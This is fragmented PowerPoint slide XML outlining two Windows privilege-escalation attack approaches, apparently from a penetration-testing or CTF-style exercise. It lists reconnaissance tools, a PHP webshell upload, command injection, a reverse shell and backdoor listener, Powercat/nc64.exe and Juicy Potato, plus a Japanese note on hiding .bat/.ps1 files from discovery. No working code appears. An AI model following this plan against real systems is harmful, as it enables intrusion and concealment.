              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>bat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>を置くか既存のものに追記（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ps1</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイルは見つからないように対比させる必要あり）→隠しファイル化、場所はどこにするか</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>bat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイルならどうか？</a:t>
            </a:r>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3</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2102984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718323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103468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155373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27021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88576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6097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86727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985020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37748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599822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74506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22D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/7</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8573688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四角形: 角を丸くする 76">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D8C7109-BCB9-4099-8CFF-100C6050DF24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6591644" y="1586457"/>
            <a:ext cx="4878244" cy="124968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8" name="テキスト ボックス 77">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F25E53D-22CA-4594-9B83-DEC6726C2C1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6840673" y="2275381"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Download tool(nc64.exe)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    Use Powercat</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="79" name="グループ化 78">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E03B1060-4008-4289-98BD-D85CCF88E71A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6677761" y="1727741"/>
            <a:ext cx="4749018" cy="446123"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="四角形: 角を丸くする 79">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B94CC2D-A3DA-43A1-A1A1-030C6C525FF4}"/>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81" name="四角形: 角を丸くする 80">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE7F50B-7D31-44A4-8051-A6305F4FE67A}"/>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82" name="テキスト ボックス 81">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7243ED5A-8DDD-4AB6-A41A-ABC58206FD75}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394" cy="445900"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Use Exploit Tool</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="四角形: 角を丸くする 66">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{985FF41F-BE90-4796-8264-5F7ED2D9B075}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6571273" y="95997"/>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64938" y="794662"/>
            <a:ext cx="4387181" cy="1077218"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>reverseshell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600"/>
              <a:t>cmd.exe</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    login with </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>credencial</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>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3054266"/>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77895" y="328215"/>
            <a:ext cx="8065979" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach1:Privilege escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>				 from a Windows IIS server</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585564"/>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756022"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="1016191"/>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9928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Portscan,HOSTscan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Layout)</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a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>prepare </a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>webshell,php</a:t>
                </a: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24585" y="3086394"/>
            <a:ext cx="4749018" cy="499617"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>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a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>webshell</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584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Website:Google</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Dorks,dirb</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4"/>
            <a:ext cx="5026053" cy="5951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584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> jp.exe(juicy potato)</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> create injection php </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</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r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>upload php file</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>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44390" y="189418"/>
            <a:ext cx="4749018" cy="495740"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>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ssh,netcat</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> connection</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>command injection</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRP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296713" y="3665607"/>
            <a:ext cx="4207996" cy="3212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93988" y="3570257"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>set backdoor(shell listener)</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</a:t>
            </a:r>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721688" y="5224314"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Use Juicy Potato</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>(Local Privilege Escalation tool)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="419532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四角形: 角を丸くする 76">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D8C7109-BCB9-4099-8CFF-100C6050DF24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6591644" y="1586457"/>
            <a:ext cx="4878244" cy="124968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8" name="テキスト ボックス 77">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F25E53D-22CA-4594-9B83-DEC6726C2C1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6840673" y="2275381"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="79" name="グループ化 78">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E03B1060-4008-4289-98BD-D85CCF88E71A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6677761" y="1727741"/>
            <a:ext cx="4749018" cy="446123"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="四角形: 角を丸くする 79">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B94CC2D-A3DA-43A1-A1A1-030C6C525FF4}"/>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81" name="四角形: 角を丸くする 80">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE7F50B-7D31-44A4-8051-A6305F4FE67A}"/>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82" name="テキスト ボックス 81">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7243ED5A-8DDD-4AB6-A41A-ABC58206FD75}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394" cy="445900"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Use Exploit Tool</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="四角形: 角を丸くする 66">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{985FF41F-BE90-4796-8264-5F7ED2D9B075}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6571273" y="95997"/>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64938" y="794662"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> login with </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>credencial</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>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3054266"/>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77895" y="328215"/>
            <a:ext cx="8065979" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach2:Privilege escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>				 from an PowerShell and </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0" err="1"/>
              <a:t>smb</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t> </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756022"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="1016191"/>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9928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Portscan,HOSTscan</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>smb</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> server(Directory)</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a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a: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24585" y="3086394"/>
            <a:ext cx="4749018" cy="554528"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="717368"/>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676866"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>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149233" y="6076621"/>
            <a:ext cx="824265" cy="261610"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1100" dirty="0"/>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1100"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584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>hostscan:ping,nmap,nc</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    smb:enum4linux,anonymous login</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4"/>
            <a:ext cx="5026053" cy="5951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338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</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44390" y="189418"/>
            <a:ext cx="4749018" cy="495740"/>
            <a:chOff x="2472065" y="3278783"/>
